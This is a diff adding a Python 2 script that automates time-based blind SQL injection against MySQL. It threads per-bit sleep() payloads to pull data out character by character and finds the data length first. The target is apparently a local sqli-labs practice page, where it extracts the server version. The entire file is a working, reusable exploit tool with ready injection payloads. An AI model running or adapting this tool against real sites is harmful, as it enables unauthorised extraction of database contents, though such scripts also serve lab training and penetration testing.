@@ -1,0 +1,111 @@
+#!/usr/bin/env python2
+# -*- coding:utf-8 -*-
+# speed up getting data for timeblind sqli
+# By c3stbon
+
+import threading
+import requests
+import logging
+import time
+
+
+logging.basicConfig(level=logging.INFO, format="[+] %(message)s")
+logger = logging.getLogger("sqli_time_blind")
+
+TIMEOUT = 2
+
+
+class sqli(object):
+    def __init__(self):
+        pass
+
+    def request(self, url):
+        return time.time(), requests.get(url)
+
+    def datalength(self, url, data, timeout=TIMEOUT, default_length=50):
+        for i in range(default_length):
+
+            stime, resp = self.request(url % (data, i, timeout))
+
+            casttime = time.time() - stime
+
+            if (resp.status_code == 200 and casttime > timeout):
+                return i
+
+        return 0
+
+    def dump(self, url, data, char_i, n, bit, timeout):
+
+        stime, resp = self.request(url % (data, char_i+1, n+1, timeout))
+
+        casttime = time.time() - stime
+
+        if (resp.status_code == 200 and casttime > timeout):
+            bit[n] = '1'
+        else:
+            bit[n] = '0'
+
+
+def getLength(url, data):
+    stime = time.time()
+
+    s = sqli()
+
+    # get data length
+    url_lgth = url + " and (if(length(%s)=%d,sleep(%s),0))--+"
+
+    data_length = s.datalength(
+        url_lgth, data, timeout=TIMEOUT, default_length=50)
+
+    casttime = time.time() - stime
+
+    return casttime, data_length
+
+
+def getData(url, data, data_length):
+    stime = time.time()
+    s = sqli()
+
+    url_dump = (url + " and (if(mid(LPAD((BIN(ORD(MID(%s,%d,1)))),8,0),%d,1)"
+                "=1,sleep(%s),0))--+")
+
+    wds = []
+
+    for char_i in range(data_length):
+        bit = ["_" for i in range(8)]
+
+        threads = [
+            threading.Thread(
+                target=s.dump, args=(url_dump, data, char_i, n, bit, TIMEOUT))
+            for n in range(8)]
+
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+
+        logger.info(bit)
+        wds.append(chr(int("".join(bit), 2)))
+
+    logger.info("".join(wds))
+    logger.info("cast time : %d s" % (time.time() - stime))
+
+    cast_time = time.time() - stime
+
+    return cast_time, "".join(wds)
+
+
+if __name__ == '__main__':
+
+    stime = time.time()
+
+    s = sqli()
+    url = "http://192.168.10.22/sqli/Less-1/?id=1'"
+    # db = 'version()'
+    db = 'version()'
+
+    cast_time, length = getLength(url, db)
+    logger.info("cast_time: %s \tlength: %d" % (cast_time, length))
+
+    if length > 0:
+        logger.info(getData(url, db, length))
